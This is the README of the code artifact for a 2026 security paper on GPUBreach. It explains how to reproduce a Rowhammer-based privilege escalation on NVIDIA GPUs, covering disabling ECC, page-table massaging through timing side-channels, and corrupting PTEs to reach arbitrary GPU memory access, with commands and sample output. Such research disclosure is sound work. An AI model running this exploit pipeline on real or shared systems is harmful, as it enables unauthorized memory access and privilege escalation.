# GPUBreach (47th IEEE Symposium on Security and Privacy)

## Introduction

This is the code artifact for the paper 
**"GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer"**, presented at [Security and Privacy 2026]([https://www.usenix.org/conference/usenixsecurity25](https://sp2026.ieee-security.org/))

Authors from University of Toronto: Chris S. Lin, Yuqin Yan, Joyce Qu, Joseph Zhu, Guozhen Ding, David Lie, Gururaj Saileshwar.
## Required Environment
**Run-time Environment:**  We suggest using a Linux distribution compatible with g++-11 or newer.

- Software Dependencies:
   - CMake 3.22+
   - g++ with C++17 Support
   - NVIDIA CUDA Driver: (545.23.08 - 580.95.05 Tested)
   - NVIDIA CUDA Toolkit
   - NVIDIA System Management Interface `nvidia-smi`

- Hardware Dependencies:
   - NVIDIA GPU sm_80+

### Reference Environment
Our reference system:

- OS: Ubuntu 22.04.5 LTS
- CPU: AMD Ryzen Threadripper PRO 5945WX 12-Cores
- GPU: NVIDIA RTX A6000 (48 GB GDDR6, sm_80)
- Driver: NVIDIA Driver 580.95.05 (includes nvidia-smi)
- CUDA Toolkit: 12.3
- Compiler: g++ 11.4.90 with C++17 support

## Steps for Artifact Evaluation

### 1. Clone the Repository (Ignore for Zenodo users)

Ensure you have already cloned the repository:
```bash
git clone https://github.com/sith-lab/gpubreach.git
cd gpubreach
```

### 2. GPU Setup

For the Rowhammer attack, a prerequiste is having **ECC disabled**. This is already the default setting on many A6000 GPUs. But if it is enabled, use the following commands to disable it:
```bash
sudo nvidia-smi -e 0
rmmod nvidia_drm 
rmmod nvidia_modeset
sudo reboot
```

Our profiling is easier with the persistence mode enabled, and with fixed GPU and memory clock rates, although these are not pre-requisites. The following script performs the above actions:
```bash
# Example usage: 
#  bash ./gpuhammer/util/init_cuda.sh <MAX_GPU_CLOCK> <MAX_MEMORY_CLOCK>
bash ./gpubreach/gpuhammer/util/init_cuda.sh 1800 7600
```
**MAX_GPU_CLOCK** and **MAX_MEMORY_CLOCK** can be found with `deviceQuery` from CUDA samples. We provide this for A6000 in 'gpuhammer/src/deviceQuery.txt'. 

These changes can be undone with `bash ./gpubreach/gpuhammer/util/reset_cuda.sh`.

### 2. NVIDIA Driver Setup

1. GPU-TLB 2. GPU-CPU Modifications

### 3. Download ImageNet Validation Dataset

Our artifact requires the ImageNet 2012 Validation Dataset, which is available from the official ImageNet website. Please note that downloading requires a (free) ImageNet account — please register at https://www.image-net.org/download-images.php before proceeding.

We require the "Validation images (all tasks)" under Images when inside the ImageNet 2012 DataSet webpage. Please obtain the download link and download it **to the repository root** as follows:

```bash
# Make sure you are downloading the file into the repository root directory
cd gpubreach
wget <download link>
```

The downloaded file's name should be `ILSVRC2012_img_val.tar`.

### 4. Run the Artifact
Run the following commands to install dependencies, build GPUBreach and the exploits. However, `./run_auto_artifacts.sh` will only run those that can be done _non-interactively_. The exploits in Section 6 requires GPUBreach, which is an interactive interface for the next section: **Detailed Steps to Run & Perform GPUBreach Steps**.

```bash
cd gpubreach
bash ./run_auto_artifacts.sh
```

This command will run the following steps:

* Run GPUBreach Experiments for PT Region Massaging:

  ```bash
  bash run_fig5.sh
  bash run_fig7.sh
  bash run_fig8.sh
  bash run_fig10.sh 
  ```

and the results will be stored in `results/fig*`.

**NOTE:** We additionally provide sample outputs of all experiments in the folder `./results/sample`.

## Detailed Steps to Run & Perform GPUBreach Steps

### Project Structure

```txt
.
📄 gpubreach.py: Python script to help navigate GPUBreach's various stages and example apps.
📂 /src
│
├── 📂 /include: contains the core code to launch GPUHammer and utils for GPUBreach massaging
│   └── 📄 rh_*: Directly ported from GPUHammer to launch Rowhammer with minimal amount of code.
│   └── 📄 gpubreach_util.cu/h: CUDA Kernels and utility C++ functions for massaging.

├── 📄 CMakeList.txt
├── 📄 gpubreach_main.cu: main function to run different steps of GPUBreach.
├── 📄 app_cli.cu: sample command line interface to try out arbitrary RW on GPU Memory.
├── 📄 app_transfer.cu: sample program to transfer arbitrary RW primitive to another processs.
├── 📄 s1_allocallmem.*: Step 1 of GPUBreach, using UVM timing side-channel to get system memory limit.
|
├── 📄 s2_firstRegion.*: Step 2 of GPUBreach, using UVM timing side-channel and 4KB page tables to massage PT regions to flippy locations.
|
├── 📄 s3_firstRegion_hammer.*: Step 3 of GPUBreach, fill new PT region with PTEs and perform GPUHammer. Repeated multiple times on random PTEs if corruption not observed.
|
└── 📄 s4_secondRegion.*: Step 4 of GPUBreach, same as sc_firstRegion.
```

### Step 0. Compile
```bash
cmake -S ./src -B ./src/out/
cd ./src/out/
make
```
```
# Display available tasks
python3 gpubreach.py -h

# Display usage to the specific task
python3 gpubreach.py <task> -h
```

### Step 1. Fill GPU Memory
We recommend enabling the verbose option `-v` when testing. Given different GPUs may have different timing, we run the following to get a sense of the timing spike:

```bash
python3 gpubreach.py all_mem_test -t 0.2 -s 15 -v
```

where `-t 0.2` is means a threshold of 0.2ms, which we classify any time above this **threshold** as a timing spike, and `15` is how many initial measurements to **skip**, given usually the first few measurements take longer when GPU is warming up.

In general, this **threshold** should be correct and you will see:
```txt
24106 Recorded time: 0.059685 ms
24107 Recorded time: 0.060716 ms
24108 Recorded time: 0.060145 ms
24109 Recorded time: 0.332168 ms
24110 Recorded time: 0.323271 ms
24111 Recorded time: 0.277172 ms
Spikes observed after allocation index 24109
This means you should perform at most 24109 number of allocations to avoid eviction
Pass 24109 as the limit in subsequent experiments.
```

If not, inspect the output of the time to observe **consecutive timing spikes** and see what is your GPU's eviction timing threshold.

You can then run this command to control the number of allocations, which is what the future steps will use.
```bash
python3 gpubreach.py all_mem --n_step1 24109 -t 0.2 -s 15 -v
```
The output should stop at 24108, as this is the maximum memory before any evictions. If you increase `--n_step1`, you should expect to see the same behavior as before.

### Step 2. Massaging PT Region
Taking the number we found from **Step 1**, we use it to perform the massaging step. We will test that the timing side-channel with 4KB pages works as intended by running the test command below:

```bash
python3 gpubreach.py first_region_test --n_step1 24109 -t 0.2 -s 15 -v
```

The final output should not be longer than 1024 (but around 800-900 ish), as we generate PT regions very fast. If it is going longer, your **threshold** may be too high, lower it or see below how it is supposed to behave:

```txt
...
316 New PT time: 0.024847 ms
317 New PT time: 0.024817 ms
318 New PT time: 0.247276 ms
Found First Allocation Spike: **318**., Time:  0.247276.
Next Allocation Spike Id:  **826**.

...
824 New PT time: 0.024828 ms
825 New PT time: 0.02575 ms
826 New PT time: 0.242807 ms
Expected: id **826**. Found Spike id: **826**.
```

There are no direct way to verify whether the massaging worked directly after this point. However, if one have a page table dumper installed like `https://github.com/0x5ec1ab/gpu-tlb/tree/main/extractor`, you can check whether a PT region is resident where you expect it to.

Run the following to see how it will look like in the complete pipeline:
```bash
BREACH_DEBUG=1 ./sc_main first_region 24184 0.2 15
```

Should look like this:
```txt
821 New PT time: 0.022894 ms
822 New PT time: 0.035759 ms
(Step 2 Success) First PT Region Generated: Press Enter Key to continue...
```

### Step 3: 

Once you believe (or verified) the massaging is working as intended, we now will move to filling the PT region with PTEs and hammer it. The current program simply fills the PT region adhocly by filling the entire memory again as we will need this anyway in **Step 4** (but with 64KB pages instead of 2MB). 

To get the new memory limit after our massaging/**Step 2**, run this command and follow the same procedure as **Step 1**, and tune the **threshold** if needed. 
```bash
python3 gpubreach.py first_region_atk_mem_test --n_step1 24109 -t 0.2 -s 15 -v
```
It should be a slightly lower number than **Step 1**, and run multiple times if needed to verify that this occurs consistently:
```txt
24068 New PT time: 0.078081 0x7fafa8c00000 ms
24069 New PT time: 0.077109 0x7fafa8e00000 ms
24070 New PT time: 1.1084 0x7fafa9000000 ms
24071 New PT time: 1.05451 0x7fafa9200000 ms
24072 New PT time: 1.0424 0x7fafa9400000 ms
24073 New PT time: 0.992982 0x7fafa9600000 ms
24074 New PT time: 0.897697 0x7fafa9800000 ms
Spikes observed after allocation index 24070
This means you should perform at most 24070 number of allocations to avoid eviction
Pass 24070 as the limit in subsequent experiments.
```

Now we can see whether our attack really worked:

```bash
python3 gpubreach.py first_region_atk --n_step1 24109 --n_step3 24070 -t 0.2 -s 15 -v
```

You should usually get it first try on our machine.
```txt
First PT Region Filled Round 0 Completed
Filling In Identifing Information for Each Page... 
Identifing Data Placed, Hammer Starts...
Hammer Done, Finding Corruption... (Rare: If taking longer than 5s, CTRL + C and stop the program)

After 1 repeats
Corrupted: 0x7ef8476e0000. Victim: 0x7ef8466e0000
Found victim id.
(Step 3 Success) Found Corrupted PFN Destination: Press Enter Key to continue...
```

### Step 4: 
This step does the same thing as **Step 2** and completes the exploit.

```bash
python3 gpubreach.py second_region --n_step1 24109 --n_step3 24070 -t 0.2 -s 15 -v
```

It will print out a bunch of PTEs of 2MB cudaMalloced memories, which isn't available for normal users, showing that we have access to modify them. It also outputs the elapsed time, but given the verbose output and also that, the driver we provide is modified in order to provide helpful information in reviewing and executing the exploits, take the elapsed time as a grain of salt.

```txt
4f90: 1 0 e6 5 0 0 0 6 
4fa0: 1 0 e8 5 0 0 0 6 
4fb0: 1 0 ea 5 0 0 0 6 
(Step 4 Success) Second PT Region Now in Attacker Controlled Region. We printed out the PTEs of the controlled page and provided relevant pointers to interact with them in struct S4_ExploitComplete.
Those looking like '1 0 76 3 0 0 0 6' are 2MB cudaMalloc PTEs, while '1 55 b4 59 0 0 0 6' means they are the 4KB PTEs.
Press Enter Key to continue...

Elapsed time: 31.7281 seconds
```

## Section 6 Exploits w/ GPUBreach


